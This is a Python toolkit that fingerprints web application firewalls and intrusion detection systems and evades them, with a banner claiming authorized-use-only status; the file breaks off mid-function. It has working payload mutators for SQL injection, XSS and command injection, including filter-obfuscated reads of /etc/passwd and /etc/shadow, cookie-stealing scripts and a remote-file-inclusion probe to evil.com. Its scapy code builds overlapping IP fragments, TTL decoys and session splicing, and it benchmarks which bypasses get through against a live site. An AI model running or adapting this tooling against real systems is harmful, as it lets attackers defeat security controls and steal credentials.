#!/usr/bin/env python3
"""
===============================================================================
  FU PERSON :: IDS / IPS / WAF DETECTION & EVASION TOOLKIT v1.0
  WAF Fingerprinting | IDS Detection | Payload Mutation | Fragmentation
  Evasion Testing | Bypass Benchmarking | Protocol-Level Techniques
===============================================================================

  AUTHORIZATION REQUIRED - DO NOT USE WITHOUT WRITTEN PERMISSION

  LEGAL NOTICE:
  IDS/WAF evasion tools are intended for AUTHORIZED penetration testing,
  red-team operations, and security research with explicit written consent.

  FLLC
  Government-Cleared Security Operations
===============================================================================
"""

import os, sys, re, json, time, random, string, struct, socket
import argparse, urllib.parse, urllib.request, urllib.error
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any, Callable

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

try:
    import requests as _requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from scapy.all import (
        IP, TCP, UDP, Raw, send, sr1, fragment as scapy_fragment,
        RandShort, conf as scapy_conf,
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


# =============================================================================
#  ANSI COLORS & DISPLAY
# =============================================================================

class C:
    R   = "\033[0m"
    BLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YLW = "\033[93m"
    BLU = "\033[94m"
    MAG = "\033[95m"
    CYN = "\033[96m"
    WHT = "\033[97m"

    @staticmethod
    def p(text: str):
        try:
            print(text)
        except UnicodeEncodeError:
            print(re.sub(r"\033\[[0-9;]*m", "", str(text)))

    @staticmethod
    def ok(msg: str):   C.p(f"  {C.GRN}[+]{C.R} {msg}")
    @staticmethod
    def info(msg: str): C.p(f"  {C.BLU}[*]{C.R} {msg}")
    @staticmethod
    def warn(msg: str): C.p(f"  {C.YLW}[!]{C.R} {msg}")
    @staticmethod
    def fail(msg: str): C.p(f"  {C.RED}[-]{C.R} {msg}")

    @staticmethod
    def banner(title: str):
        w = 70
        C.p(f"\n  {C.MAG}{C.BLD}{'=' * w}")
        C.p(f"  {'':>2}{title}")
        C.p(f"  {'=' * w}{C.R}")


# =============================================================================
#  DATA STRUCTURES
# =============================================================================

@dataclass
class WAFResult:
    detected: bool = False
    waf_name: str = "Unknown"
    confidence: float = 0.0
    evidence: List[str] = field(default_factory=list)
    bypass_suggestions: List[str] = field(default_factory=list)

@dataclass
class IDSResult:
    detected: bool = False
    ids_type: str = "Unknown"
    confidence: float = 0.0
    evidence: List[str] = field(default_factory=list)
    timing_delta_ms: float = 0.0
    ttl_anomaly: bool = False

@dataclass
class MutationResult:
    technique: str = ""
    original: str = ""
    mutated: str = ""
    encoding_layers: int = 0

@dataclass
class EvasionResult:
    technique: str = ""
    payload_sent: str = ""
    response_code: int = 0
    blocked: bool = True
    response_snippet: str = ""
    latency_ms: float = 0.0


# =============================================================================
#  HTTP HELPER (requests with urllib fallback)
# =============================================================================

class _HTTP:
    @staticmethod
    def get(url: str, headers: Optional[Dict[str, str]] = None,
            timeout: float = 10.0) -> Tuple[int, Dict[str, str], str]:
        hdrs = headers or {}
        if HAS_REQUESTS:
            try:
                r = _requests.get(url, headers=hdrs, timeout=timeout,
                                  allow_redirects=True, verify=False)
                return r.status_code, {k.lower(): v for k, v in r.headers.items()}, r.text[:8192]
            except _requests.RequestException as exc:
                return 0, {}, str(exc)
        req = urllib.request.Request(url, headers=hdrs, method="GET")
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                rh = {k.lower(): v for k, v in resp.getheaders()}
                return resp.status, rh, resp.read(8192).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            rh = {k.lower(): v for k, v in exc.headers.items()} if exc.headers else {}
            body = exc.read(8192).decode("utf-8", errors="replace") if exc.fp else ""
            return exc.code, rh, body
        except Exception as exc:
            return 0, {}, str(exc)


# =============================================================================
#  WAF SIGNATURES DATABASE
# =============================================================================

def _sig(headers: Dict[str, str], cookies: List[str],
         body: List[str], codes: List[int]) -> Dict[str, Any]:
    return {"headers": headers, "cookies": cookies, "body": body, "codes": codes}

WAF_SIGNATURES: Dict[str, Dict[str, Any]] = {
    "Cloudflare":        _sig({"server": "cloudflare", "cf-ray": ""}, ["__cfduid", "cf_clearance", "__cf_bm"],
                              ["attention required! | cloudflare", "cloudflare ray id"], [403, 503]),
    "Akamai":            _sig({"server": "akamaighost", "x-akamai-transformed": ""}, ["akamai_g", "ak_bmsc"],
                              ["access denied", "akamai ghost"], [403]),
    "AWS WAF":           _sig({"x-amzn-requestid": "", "x-amz-cf-id": ""}, ["awsalb", "awsalbcors"],
                              ["request blocked", "aws waf"], [403]),
    "ModSecurity":       _sig({"server": "mod_security", "x-mod-security": ""}, [],
                              ["mod_security", "modsecurity", "not acceptable"], [403, 406]),
    "Imperva/Incapsula": _sig({"x-cdn": "incapsula", "x-iinfo": ""}, ["incap_ses_", "visid_incap_"],
                              ["incapsula incident id", "powered by incapsula"], [403]),
    "F5 BigIP":          _sig({"server": "bigip", "x-cnection": ""}, ["bigipserver", "f5_cspm"],
                              ["the requested url was rejected", "f5 networks"], [403]),
    "Barracuda":         _sig({"server": "barracuda"}, ["barra_counter_session", "bni__barracuda_lvs"],
                              ["barracuda web application firewall"], [403]),
    "Sucuri":            _sig({"server": "sucuri", "x-sucuri-id": ""}, ["sucuri_cloudproxy"],
                              ["sucuri website firewall", "access denied - sucuri"], [403]),
    "Wordfence":         _sig({}, ["wfwaf-authcookie"],
                              ["generated by wordfence", "potentially unsafe operation"], [403, 503]),
    "Fortinet FortiWeb": _sig({"server": "fortiweb"}, ["cookiesession1", "fgtwlssessionid"],
                              ["fortigate", "fortiweb"], [403]),
    "Citrix NetScaler":  _sig({"cneonction": "", "x-ns-rpchdr": ""}, ["ns_af", "citrix_ns_id", "nsc_"],
                              ["netscaler", "citrix application delivery"], [403, 302]),
    "DenyAll":           _sig({}, ["sessioncookie"], ["conditionblocked", "denyall"], [403]),
    "SonicWall":         _sig({"server": "sonicwall"}, ["snwlwaftoken"],
                              ["this site has been blocked", "sonicwall"], [403]),
    "Comodo":            _sig({"server": "protected by comodo"}, [], ["comodo waf"], [403]),
    "USP Secure Entry":  _sig({"server": "usp-sentry"}, [], ["usp secure entry server"], [403]),
    "Edgecast":          _sig({"server": "ecacc", "x-ec-custom-error": ""}, [],
                              ["edgecast", "verizon digital media"], [403]),
    "StackPath":         _sig({"x-sp-waf": "", "server": "stackpath"}, [],
                              ["stackpath", "you performed an action that triggered"], [403]),
    "Reblaze":           _sig({"server": "reblaze"}, ["rbzid", "rbzsessionid"],
                              ["reblaze", "access denied (403)"], [403]),
    "Radware AppWall":   _sig({"x-sl-compstate": ""}, ["reese84"],
                              ["radware", "unauthorized activity"], [403]),
    "SafeDog":           _sig({"server": "safedog"}, ["safedog-flow-item"],
                              ["safedog", "waf blocked"], [403]),
}

MALICIOUS_PROBES: List[Tuple[str, str]] = [
    ("xss", "<script>alert(1)</script>"),
    ("sqli", "' OR 1=1 UNION SELECT NULL--"),
    ("traversal", "../../../../../../etc/passwd"),
    ("cmdi", ";cat /etc/passwd"),
    ("rfi", "http://evil.com/shell.txt?"),
]

BYPASS_HINTS: Dict[str, List[str]] = {
    "Cloudflare":        ["Origin IP via DNS history", "HTTP/2 smuggling"],
    "Akamai":            ["Pragma header manipulation", "Origin via Censys/Shodan"],
    "AWS WAF":           ["Unicode normalization", "Chunked transfer encoding"],
    "ModSecurity":       ["Double encoding", "HTTP Parameter Pollution"],
    "Imperva/Incapsula": ["Long-duration timeout abuse", "JSON content-type SQLi"],
    "F5 BigIP":          ["Cookie tampering (TS cookies)", "HTTP desync"],
    "Sucuri":            ["Direct origin IP", "X-Forwarded-For whitelist"],
    "Wordfence":         ["Rate-limit timing", "REST API endpoint bypass"],
}


# =============================================================================
#  WAF DETECTOR
# =============================================================================

class WAFDetector:
    def __init__(self, timeout: float = 10.0, user_agent: Optional[str] = None):
        self._timeout = timeout
        self._ua = user_agent or ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                  "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")

    def detect(self, url: str, verbose: bool = False) -> WAFResult:
        result = WAFResult()
        scores: Dict[str, float] = {n: 0.0 for n in WAF_SIGNATURES}
        ev_map: Dict[str, List[str]] = {n: [] for n in WAF_SIGNATURES}
        hd = {"User-Agent": self._ua, "Accept": "text/html"}
        if verbose:
            C.info(f"Benign request -> {url}")
        bc, bh, bb = _HTTP.get(url, headers=hd, timeout=self._timeout)
        self._score(scores, ev_map, bc, bh, bb, "benign")
        for pn, pp in MALICIOUS_PROBES:
            sep = "&" if "?" in url else "?"
            pu = f"{url}{sep}test={urllib.parse.quote(pp)}"
            if verbose:
                C.info(f"Probe [{pn}]: {pu[:100]}...")
            code, hdrs, body = _HTTP.get(pu, headers=hd, timeout=self._timeout)
            self._score(scores, ev_map, code, hdrs, body, pn)
            time.sleep(random.uniform(0.3, 0.8))
        best = max(scores, key=scores.get)  # type: ignore[arg-type]
        bs = scores[best]
        if bs >= 2.0:
            result.detected, result.waf_name = True, best
            result.confidence = min(bs / 10.0, 1.0)
            result.evidence = ev_map[best]
            result.bypass_suggestions = BYPASS_HINTS.get(best, [
                "Double URL encoding", "HTTP Parameter Pollution", "Case randomization"])
        elif bs >= 1.0:
            result.detected, result.waf_name = True, best
            result.confidence = bs / 10.0
            result.evidence = ev_map[best]
            result.bypass_suggestions = ["Low confidence - verify manually"]
        return result

    def _score(self, scores: Dict[str, float], evidence: Dict[str, List[str]],
               code: int, hdrs: Dict[str, str], body: str, tag: str) -> None:
        body_lower = body.lower()
        for waf, sig in WAF_SIGNATURES.items():
            for hk, hv in sig["headers"].items():
                actual = hdrs.get(hk, "")
                if actual and (not hv or hv.lower() in actual.lower()):
                    scores[waf] += 3.0
                    evidence[waf].append(f"[{tag}] header '{hk}: {actual}'")
            cookie_hdr = hdrs.get("set-cookie", "") + hdrs.get("cookie", "")
            for cp in sig["cookies"]:
                if cp.lower() in cookie_hdr.lower():
                    scores[waf] += 2.5
                    evidence[waf].append(f"[{tag}] cookie '{cp}'")
            for bp in sig["body"]:
                if bp.lower() in body_lower:
                    scores[waf] += 2.0
                    evidence[waf].append(f"[{tag}] body match '{bp}'")
            if code in sig["codes"] and tag != "benign":
                scores[waf] += 1.0
                evidence[waf].append(f"[{tag}] status {code} on malicious probe")


# =============================================================================
#  IDS DETECTOR
# =============================================================================

class IDSDetector:
    def __init__(self, timeout: float = 5.0):
        self._timeout = timeout

    def detect(self, target: str, port: int = 80, iterations: int = 5) -> IDSResult:
        result = IDSResult()
        ev: List[str] = []
        tm = self._timing_analysis(target, port, iterations)
        if tm["suspicious"]:
            result.confidence += 0.3
            ev.append(f"Timing delta: {tm['delta_ms']:.1f}ms (threshold 50ms)")
            result.timing_delta_ms = tm["delta_ms"]
        if HAS_SCAPY:
            ttl = self._ttl_analysis(target, port)
            if ttl["anomaly"]:
                result.confidence += 0.35; result.ttl_anomaly = True
                ev.append(f"TTL inconsistency: {ttl['ttl_values']}")
            rst = self._rst_analysis(target, port)
            if rst["ids_rst"]:
                result.confidence += 0.25
                ev.append(f"RST TTL mismatch: normal={rst['normal_ttl']}, rst={rst['rst_ttl']}")
            ts = self._timestamp_analysis(target, port)
            if ts["anomaly"]:
                result.confidence += 0.1; ev.append("TCP timestamp clock skew on inline device")
        else:
            ev.append("Scapy not available - TTL/RST/timestamp analysis skipped")
        result.detected = result.confidence >= 0.3
        result.evidence = ev
        if result.detected:
            result.ids_type = "Inline IDS/IPS" if result.ttl_anomaly else "Passive IDS (probable)"
        return result

    def _timing_analysis(self, target: str, port: int, iters: int) -> Dict[str, Any]:
        bd = b"GET / HTTP/1.1\r\nHost: test\r\n\r\n"
        md = b"GET /etc/passwd HTTP/1.1\r\nHost: test\r\nX-Payload: ' OR 1=1--\r\n\r\n"
        bt, mt = [], []
        for _ in range(iters):
            bt.append(self._tcp_time(target, port, bd)); time.sleep(random.uniform(0.1, 0.3))
            mt.append(self._tcp_time(target, port, md)); time.sleep(random.uniform(0.1, 0.3))
        ab, am = sum(bt)/max(len(bt),1), sum(mt)/max(len(mt),1)
        delta = abs(am - ab) * 1000
        return {"suspicious": delta > 50.0, "delta_ms": delta}

    def _tcp_time(self, target: str, port: int, data: bytes) -> float:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self._timeout); t0 = time.perf_counter()
            s.connect((target, port)); s.sendall(data); s.recv(1024)
            el = time.perf_counter() - t0; s.close(); return el
        except Exception:
            return self._timeout

    def _ttl_analysis(self, target: str, port: int) -> Dict[str, Any]:
        ttls: List[int] = []
        for payload in [b"GET / HTTP/1.1\r\n\r\n",
                        b"GET /' OR '1'='1 HTTP/1.1\r\n\r\n",
                        b"GET /<script>alert(1)</script> HTTP/1.1\r\n\r\n"]:
            try:
                reply = sr1(IP(dst=target) / TCP(dport=port, flags="S"),
                            timeout=self._timeout, verbose=0)
                if reply and reply.haslayer(IP):
                    ttls.append(reply[IP].ttl)
            except Exception:
                continue
        return {"anomaly": len(set(ttls)) > 1 and len(ttls) >= 2, "ttl_values": list(set(ttls))}

    def _rst_analysis(self, target: str, port: int) -> Dict[str, Any]:
        try:
            sa = sr1(IP(dst=target) / TCP(dport=port, flags="S"),
                     timeout=self._timeout, verbose=0)
            normal_ttl = sa[IP].ttl if sa else 0
            closed = random.randint(50000, 60000)
            rst = sr1(IP(dst=target) / TCP(dport=closed, flags="S"),
                      timeout=self._timeout, verbose=0)
            rst_ttl = rst[IP].ttl if rst else 0
            return {"ids_rst": abs(normal_ttl - rst_ttl) > 5 and min(normal_ttl, rst_ttl) > 0,
                    "normal_ttl": normal_ttl, "rst_ttl": rst_ttl}
        except Exception:
            return {"ids_rst": False, "normal_ttl": 0, "rst_ttl": 0}

    def _timestamp_analysis(self, target: str, port: int) -> Dict[str, Any]:
        timestamps: List[int] = []
        try:
            for _ in range(3):
                pkt = IP(dst=target) / TCP(dport=port, flags="S",
                         options=[(b"Timestamp", (int(time.time()), 0))])
                reply = sr1(pkt, timeout=self._timeout, verbose=0)
                if reply and reply.haslayer(TCP):
                    for name, val in reply[TCP].options:
                        if name in (b"Timestamp", "Timestamp"):
                            timestamps.append(val[0] if isinstance(val, tuple) else val)
                time.sleep(0.5)
        except Exception:
            pass
        if len(timestamps) >= 2:
            diffs = [timestamps[i+1] - timestamps[i] for i in range(len(timestamps)-1)]
            return {"anomaly": (max(diffs) - min(diffs)) > 1000 if diffs else False,
                    "timestamps": timestamps}
        return {"anomaly": False, "timestamps": timestamps}


# =============================================================================
#  PAYLOAD MUTATOR
# =============================================================================

class PayloadMutator:
    TECHNIQUES_SQL: List[str] = [
        "case_rand", "comment_inject", "url_encode", "double_url_encode",
        "hex_encode", "whitespace_sub", "string_concat", "char_func", "unicode_encode"]
    TECHNIQUES_XSS: List[str] = [
        "html_entity", "js_unicode", "event_handler", "protocol_alt", "tag_alt", "polyglot"]
    TECHNIQUES_CMD: List[str] = ["var_expand", "backtick", "wildcard", "newline_inject"]

    def mutate(self, payload: str, technique: str) -> MutationResult:
        fn = {
            "case_rand": self._case_rand, "comment_inject": self._comment_inject,
            "url_encode": self._url_enc, "double_url_encode": self._dbl_url_enc,
            "unicode_encode": self._uni_url_enc, "hex_encode": self._hex_enc,
            "whitespace_sub": self._ws_sub, "string_concat": self._str_concat,
            "char_func": self._char_func, "html_entity": self._html_ent,
            "js_unicode": self._js_uni, "event_handler": self._evt_handler,
            "protocol_alt": self._proto_alt, "tag_alt": self._tag_alt,
            "polyglot": self._polyglot, "var_expand": self._var_expand,
            "backtick": self._backtick, "wildcard": self._wildcard,
            "newline_inject": self._newline,
        }.get(technique)
        if not fn:
            return MutationResult(technique=technique, original=payload, mutated=payload)
        return MutationResult(technique=technique, original=payload,
                              mutated=fn(payload), encoding_layers=1)

    def auto_mutate(self, payload: str,
                    target_waf: Optional[str] = None) -> List[MutationResult]:
        pl = payload.lower()
        if any(k in pl for k in ("select", "union", "insert", "update", "drop")):
            techs = self.TECHNIQUES_SQL
        elif any(k in pl for k in ("<script", "onerror", "onload", "alert")):
            techs = self.TECHNIQUES_XSS
        elif any(k in pl for k in (";", "|", "`", "$(", "/etc/")):
            techs = self.TECHNIQUES_CMD
        else:
            techs = self.TECHNIQUES_SQL + self.TECHNIQUES_XSS[:2]

        if target_waf:
            wl = target_waf.lower()
            if "modsecurity" in wl:
                techs = ["double_url_encode", "comment_inject", "unicode_encode", "case_rand", "char_func"]
            elif "cloudflare" in wl:
                techs = ["unicode_encode", "hex_encode", "polyglot", "whitespace_sub", "string_concat"]
            elif "imperva" in wl or "incapsula" in wl:
                techs = ["comment_inject", "case_rand", "char_func", "double_url_encode", "whitespace_sub"]
            elif "aws" in wl:
                techs = ["unicode_encode", "comment_inject", "case_rand", "hex_encode"]
        return [self.mutate(payload, t) for t in techs]

    # -- SQL mutations ---------------------------------------------------------
    @staticmethod
    def _case_rand(p: str) -> str:
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in p)

    @staticmethod
    def _comment_inject(p: str) -> str:
        for kw in ("UNION", "SELECT", "INSERT", "UPDATE", "DELETE",
                    "FROM", "WHERE", "AND", "OR", "ORDER", "GROUP"):
            p = re.compile(re.escape(kw), re.IGNORECASE).sub("/**/".join(kw), p, count=1)
        return p

    @staticmethod
    def _url_enc(p: str) -> str:
        return urllib.parse.quote(p, safe="")

    @staticmethod
    def _dbl_url_enc(p: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")

    @staticmethod
    def _uni_url_enc(p: str) -> str:
        return "".join(f"%u{ord(c):04x}" if not c.isalnum() else c for c in p)

    @staticmethod
    def _hex_enc(p: str) -> str:
        kws = {"SELECT", "UNION", "FROM", "WHERE", "AND", "OR"}
        return " ".join("0x" + t.encode().hex() if t.upper() in kws else t for t in p.split())

    @staticmethod
    def _ws_sub(p: str) -> str:
        alts = ["\t", "\n", "\r", "/**/", "%09", "%0a", "%0d"]
        return "".join(random.choice(alts) if c == " " else c for c in p)

    @staticmethod
    def _str_concat(p: str) -> str:
        parts = p.split("'")
        if len(parts) >= 3:
            return "'+'".join(parts)
        out = ""
        for i, c in enumerate(p):
            if c.isalpha() and i > 0 and p[i-1].isalpha() and random.random() > 0.6:
                out += "'+'"
            out += c
        return out

    @staticmethod
    def _char_func(p: str) -> str:
        quoted = re.findall(r"'([^']+)'", p)
        result = p
        for q in quoted:
            result = result.replace(f"'{q}'", f"CONCAT({','.join(f'CHAR({ord(c)})' for c in q)})", 1)
        if not quoted and len(p) > 6:
            chars = ",".join(f"CHAR({ord(c)})" for c in p[-6:])
            result = p[:-6] + f"CONCAT({chars})"
        return result

    # -- XSS mutations ---------------------------------------------------------
    @staticmethod
    def _html_ent(p: str) -> str:
        return "".join(f"&#x{ord(c):x};" if c in "<>\"'&/" else c for c in p)

    @staticmethod
    def _js_uni(p: str) -> str:
        return "".join(f"\\u{ord(c):04x}" if not c.isalnum() else c for c in p)

    @staticmethod
    def _evt_handler(_: str) -> str:
        return random.choice([
            '<img src=x onerror="alert(1)">', '<svg onload="alert(1)">',
            '<body onpageshow="alert(1)">', '<input onfocus="alert(1)" autofocus>',
            '<marquee onstart="alert(1)">', '<details open ontoggle="alert(1)">',
            '<video><source onerror="alert(1)">'])

    @staticmethod
    def _proto_alt(_: str) -> str:
        return random.choice([
            'javascript:alert(1)//', 'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>//'])

    @staticmethod
    def _tag_alt(_: str) -> str:
        return random.choice([
            '<svg/onload=alert(1)>', '<iframe src="javascript:alert(1)">',
            '<details/open/ontoggle=alert(1)>',
            '<embed src="data:text/html,<script>alert(1)</script>">',
            '<object data="javascript:alert(1)">'])

    @staticmethod
    def _polyglot(_: str) -> str:
        return random.choice([
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0d%0a",
            "'\"-->]]>*/</script></style></noscript></xmp></title><img src=x onerror=alert(1)>",
            "-->'\"\\><svg/onload=alert()>"])

    # -- Command injection mutations -------------------------------------------
    @staticmethod
    def _var_expand(p: str) -> str:
        return p.replace(" ", "${IFS}").replace("/", "${PATH%%[a-z]*}")

    @staticmethod
    def _backtick(p: str) -> str:
        cmds = {"cat": "`which cat`", "ls": "`which ls`",
                "id": "`which id`", "whoami": "`which whoami`"}
        for cmd, rep in cmds.items():
            if cmd in p.split():
                p = p.replace(cmd, rep, 1)
        return p

    @staticmethod
    def _wildcard(p: str) -> str:
        wm = {"/etc/passwd": "/???/??ss??", "/bin/cat": "/???/??t",
              "/bin/sh": "/???/??", "cat ": "/???/??t "}
        for orig, wild in wm.items():
            p = p.replace(orig, wild)
        return p

    @staticmethod
    def _newline(p: str) -> str:
        sep = random.choice(["%0a", "%0d%0a", "\n", "$'\\n'"])
        return p.replace(";", sep).replace("|", sep)


# =============================================================================
#  FRAGMENTATION ENGINE
# =============================================================================

class FragmentationEngine:
    def __init__(self):
        if not HAS_SCAPY:
            C.warn("Scapy not available - fragmentation disabled")

    def fragment_ip(self, target: str, port: int, payload: bytes,
                    frag_size: int = 8) -> List[Any]:
        if not HAS_SCAPY:
            return []
        return scapy_fragment(IP(dst=target) / TCP(dport=port) / Raw(load=payload),
                              fragsize=frag_size)

    def overlap_fragments(self, target: str, port: int, payload: bytes) -> List[Any]:
        if not HAS_SCAPY:
            return []
        frags: List[Any] = []; fsz, off, i = 16, 0, 0
        while i < len(payload):
            end = min(i + fsz, len(payload))
            frags.append(IP(dst=target, flags="MF" if end < len(payload) else 0,
                            frag=off//8) / TCP(dport=port) / Raw(load=payload[i:end]))
            if end < len(payload) and fsz > 8:
                os_ = max(0, i + fsz - 8)
                frags.append(IP(dst=target, flags="MF", frag=(off+fsz-8)//8) /
                             TCP(dport=port) / Raw(load=payload[os_:os_+fsz]))
            off += fsz; i = end
        return frags

    def ttl_evasion(self, target: str, port: int, payload: bytes,
                    ids_ttl: int = 10, target_ttl: int = 64) -> List[Any]:
        if not HAS_SCAPY:
            return []
        decoy = IP(dst=target, ttl=ids_ttl) / TCP(dport=port) / Raw(load=b"GET / HTTP/1.1\r\n\r\n")
        real = IP(dst=target, ttl=target_ttl) / TCP(dport=port) / Raw(load=payload)
        return [decoy, real]

    def tcp_segmentation(self, target: str, port: int, data: bytes,
                         segment_size: int = 2) -> List[Any]:
        if not HAS_SCAPY:
            return []
        segs: List[Any] = []
        seq = random.randint(1000, 65000)
        for i in range(0, len(data), segment_size):
            chunk = data[i:i + segment_size]
            segs.append(IP(dst=target) / TCP(dport=port, flags="PA", seq=seq) / Raw(load=chunk))
            seq += len(chunk)
        return segs

    def session_splicing(self, target: str, port: int, data: bytes,
                         chunk_size: int = 4, delay: float = 0.5) -> List[Any]:
        if not HAS_SCAPY:
            return []
        segs = self.tcp_segmentation(target, port, data, chunk_size)
        sent: List[Any] = []
        for seg in segs:
            try:
                send(seg, verbose=0)
                sent.append(seg)
                time.sleep(delay)
            except Exception:
                break
        return sent

    def send_fragments(self, fragments: List[Any], delay: float = 0.0,
                       verbose: bool = False) -> int:
        if not HAS_SCAPY:
            return 0
        ct = 0
        for f in fragments:
            try:
                send(f, verbose=0); ct += 1
                if verbose:
                    C.info(f"Sent {ct}/{len(fragments)}")
                if delay > 0:
                    time.sleep(delay)
            except Exception:
                continue
        return ct


# =============================================================================
#  EVASION TESTER
# =============================================================================

class EvasionTester:
    def __init__(self, timeout: float = 10.0, user_agent: Optional[str] = None):
        self._timeout = timeout
        self._ua = user_agent or ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                  "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
        self._mutator = PayloadMutator()

    def test_bypass(self, url: str, payload: str,
                    techniques: Optional[List[str]] = None) -> List[EvasionResult]:
        if techniques is None:
            techniques = (PayloadMutator.TECHNIQUES_SQL +
                          PayloadMutator.TECHNIQUES_XSS +
                          PayloadMutator.TECHNIQUES_CMD)
        results: List[EvasionResult] = []
        headers = {"User-Agent": self._ua}

        C.info(f"Baseline (raw) payload -> {url}")
        code, _, body, lat = self._probe(url, payload, headers)
        results.append(EvasionResult(
            technique="raw (no evasion)", payload_sent=payload,
            response_code=code, blocked=self._blocked(code, body),
            response_snippet=body[:200], latency_ms=lat))

        for tech in techniques:
            m = self._mutator.mutate(payload, tech)
            if m.mutated == payload:
                continue
            code, _, body, lat = self._probe(url, m.mutated, headers)
            results.append(EvasionResult(
                technique=tech, payload_sent=m.mutated[:300],
                response_code=code, blocked=self._blocked(code, body),
                response_snippet=body[:200], latency_ms=lat))
            time.sleep(random.uniform(0.5, 1.5))
        return results

    def benchmark(self, url: str, payloads: Optional[List[str]] = None) -> List[EvasionResult]:
        if payloads is None:
            payloads = ["' OR 1=1 UNION SELECT username,password FROM users--",
                        "<script>alert(document.cookie)</script>",
                        "; cat /etc/passwd", "../../../../../../etc/shadow"]
        all_r: List[EvasionResult] = []
        for p in payloads:
            C.info(f"Benchmarking: {p[:60]}..."); all_r.extend(self.test_bypass(url, p))
        bypassed = [r for r in all_r if not r.blocked]
        C.p(""); C.banner("EVASION BENCHMARK RESULTS")
        C.ok(f"Total: {len(all_r)} | Bypassed: {C.GRN}{len(bypassed)}{C.R} | Blocked: {C.RED}{len(all_r)-len(bypassed)}{C.R}")
        if bypassed:
            C.p(f"\n  {C.BLD}Successful techniques:{C.R}")
            tc: Dict[str, int] = {}
            for r in bypassed:
                tc[r.technique] = tc.get(r.technique, 0) + 1
            for tech, cnt in sorted(tc.items(), key=lambda x: -x[1]):
                C.ok(f"  {tech}: {cnt} bypass(es)")
        return all_r

    def _probe(self, url: str, payload: str,
               headers: Dict[str, str]) -> Tuple[int, Dict[str, str], str, float]:
        sep = "&" if "?" in url else "?"
        t0 = time.perf_counter()
        code, hdrs, body = _HTTP.get(
            f"{url}{sep}q={urllib.parse.quote(payload, safe='')}", headers=headers,
            timeout=self._timeout)
        return code, hdrs, body, (time.perf_counter() - t0) * 1000

    @staticmethod
    def _blocked(code: int, body: str) -> bool:
        if code in (403, 406, 429, 503):
            return True
        bl = body.lower()
        return any(w in bl for w in (
            "blocked", "denied", "forbidden", "not acceptable", "request rejected",
            "access denied", "waf", "firewall", "security violation", "malicious"))


# =============================================================================
#  CLI INTERFACE
# =============================================================================

def _cli_waf_detect(args: argparse.Namespace) -> None:
    C.banner("WAF Detection")
    r = WAFDetector(timeout=args.timeout).detect(args.url, verbose=args.verbose)
    if r.detected:
        C.ok(f"WAF Detected: {C.BLD}{r.waf_name}{C.R}")
        C.ok(f"Confidence:   {r.confidence:.0%}")
        if r.evidence:
            C.p(f"\n  {C.BLD}Evidence:{C.R}")
            for e in r.evidence:
                C.info(f"  {e}")
        if r.bypass_suggestions:
            C.p(f"\n  {C.BLD}Bypass suggestions:{C.R}")
            for h in r.bypass_suggestions:
                C.warn(f"  {h}")
    else:
        C.warn("No WAF detected (or unrecognized)")

def _cli_ids_detect(args: argparse.Namespace) -> None:
    C.banner("IDS Detection")
    r = IDSDetector(timeout=args.timeout).detect(args.target, port=args.port,
                                                  iterations=args.iterations)
    if r.detected:
        C.ok(f"IDS Detected: {C.BLD}{r.ids_type}{C.R}")
        C.ok(f"Confidence:   {r.confidence:.0%}")
        if r.timing_delta_ms > 0:
            C.info(f"Timing delta: {r.timing_delta_ms:.1f}ms")
    else:
        C.warn("No IDS/IPS detected")
    if r.evidence:
        C.p(f"\n  {C.BLD}Evidence:{C.R}")
        for e in r.evidence:
            C.info(f"  {e}")

def _cli_mutate(args: argparse.Namespace) -> None:
    C.banner("Payload Mutation")
    m = PayloadMutator()
    if args.auto:
        results = m.auto_mutate(args.payload, target_waf=args.waf)
        C.ok(f"Generated {len(results)} mutation(s)")
        for r in results:
            C.p(f"\n  {C.CYN}{C.BLD}[{r.technique}]{C.R}")
            C.p(f"  {C.DIM}Original:{C.R} {r.original[:100]}")
            C.p(f"  {C.GRN}Mutated:{C.R}  {r.mutated[:200]}")
    else:
        r = m.mutate(args.payload, args.technique or "case_rand")
        C.ok(f"Technique: {r.technique}")
        C.p(f"  {C.DIM}Original:{C.R} {r.original}")
        C.p(f"  {C.GRN}Mutated:{C.R}  {r.mutated}")

def _cli_fragment(args: argparse.Namespace) -> None:
    C.banner("Packet Fragmentation")
    if not HAS_SCAPY:
        C.fail("Scapy required. Install: pip install scapy")
        return
    eng = FragmentationEngine()
    payload = args.payload.encode() if isinstance(args.payload, str) else args.payload

    method_map: Dict[str, Callable[[], List[Any]]] = {
        "ip":      lambda: eng.fragment_ip(args.target, args.port, payload, args.size),
        "overlap": lambda: eng.overlap_fragments(args.target, args.port, payload),
        "ttl":     lambda: eng.ttl_evasion(args.target, args.port, payload,
                                            ids_ttl=args.ids_ttl, target_ttl=args.target_ttl),
        "tcp":     lambda: eng.tcp_segmentation(args.target, args.port, payload, args.size),
    }
    if args.method == "splice":
        C.info(f"Session splicing with {args.delay}s delay...")
        sent = eng.session_splicing(args.target, args.port, payload,
                                     chunk_size=args.size, delay=args.delay)
        C.ok(f"Sent {len(sent)} spliced segments")
        return
    builder = method_map.get(args.method)
    if not builder:
        C.fail(f"Unknown method: {args.method}")
        return
    frags = builder()
    C.ok(f"Created {len(frags)} fragments ({args.method}, size={args.size})")
    if args.send:
        n = eng.send_fragments(frags, delay=args.delay, verbose=args.verbose)
        C.ok(f"Sent {n}/{len(frags)} fragments")
    else:
        C.info("Use --send to transmit")
        for i, f in enumerate(frags[:5]):
